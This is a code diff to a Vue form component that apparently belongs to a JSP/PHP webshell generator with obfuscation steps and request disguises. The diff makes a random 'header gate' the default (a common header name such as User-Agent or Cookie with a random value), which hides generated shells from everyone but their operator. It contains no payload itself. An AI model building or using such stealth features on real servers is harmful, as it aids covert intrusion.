@@ -99,10 +99,23 @@ import {
 const { disposeEditorInstance, recreateEditorInstance } = useMonacoEditorInstance()
 const { monacoTheme, watchMonacoTheme } = useMonacoTheme()
 
+const COMMON_HEADER_NAMES = Object.freeze([
+  'User-Agent',
+  'Cookie',
+  'Referer',
+  'Accept-Language',
+  'Accept'
+])
+const createRandomHeaderName = () =>
+  COMMON_HEADER_NAMES[Math.floor(Math.random() * COMMON_HEADER_NAMES.length)]
+const createRandomHeaderValue = () => Math.random().toString(36).slice(2, 14).padEnd(12, '0')
+
 // 表单数据
 const form = reactive({
   ...createScriptGeneratorForm(),
-  payloadKey: generatePayloadKey()
+  payloadKey: generatePayloadKey(),
+  headerName: createRandomHeaderName(),
+  headerValue: createRandomHeaderValue()
 })
 
 // 数据
@@ -332,7 +345,10 @@ const configSummary = computed(() => {
     ]
   }
 
-  return base
+  return [
+    ...base,
+    { label: 'Header 门禁', value: form.headerName ? `${form.headerName}: ${form.headerValue || '-'}` : '-' }
+  ]
 })
 
 const configSummaryText = computed(() =>
@@ -365,6 +381,7 @@ const resultMeta = computed(() => {
       },
       { label: '类型', value: webMetadata.value?.type || form.shellType || '-' },
       { label: '目标 JDK', value: webMetadata.value?.targetJavaVersion || form.targetJavaVersion || 'auto' },
+      { label: 'Header 门禁', value: webMetadata.value?.headerConfig || `${form.headerName}: ${form.headerValue}` },
       { label: '字符编码', value: 'UTF-8' }
     ]
     if (generatedClassArtifacts.value.length) {
@@ -484,15 +501,8 @@ const getObfuscationSteps = async () => {
 
 // 生成随机请求头
 const generateRandomHeader = () => {
-  const standardHeaders = ['User-Agent', 'Cookie']
-
-  // 随机选择一个标准请求头名称
-  const randomHeader = standardHeaders[Math.floor(Math.random() * standardHeaders.length)]
-  form.headerName = randomHeader
-
-  // 生成随机请求头值（16位随机字符串）
-  const randomValue = Math.random().toString(36).substring(2, 18)
-  form.headerValue = randomValue
+  form.headerName = createRandomHeaderName()
+  form.headerValue = createRandomHeaderValue()
 }
 
 const handleGenerateTypeChange = () => {
@@ -503,8 +513,7 @@ const handleGenerateTypeChange = () => {
     form.serverType = ''
     form.serverVersion = ''
     form.packerType = ''
-    form.headerName = ''
-    form.headerValue = ''
+    generateRandomHeader()
     form.urlPattern = '/*'
     form.injectorClassName = ''
     form.shellClassName = ''
@@ -546,6 +555,7 @@ const setRuntime = (runtime) => {
   form.jspObfuscationSteps = []
   if (runtime === 'php') {
     form.shellType = 'PHP'
+    generateRandomHeader()
     const portable = Disguises.value.find((item) => item.disguiseId === 'inner_PHP_JSON_API_1.0.0')
       || availableDisguises.value[0]
     form.reqDisguiseId = portable?.disguiseId || ''
@@ -555,8 +565,7 @@ const setRuntime = (runtime) => {
     form.phpOutputMode = metadata.defaultOutputMode || 'compact'
   } else {
     form.shellType = 'JSP'
-    form.headerName = ''
-    form.headerValue = ''
+    generateRandomHeader()
     const javaDisguise = Disguises.value.find((item) => item.disguiseId === 'inner_Java_Base64_1.0.0')
       || Disguises.value[0]
     form.reqDisguiseId = javaDisguise?.disguiseId || ''
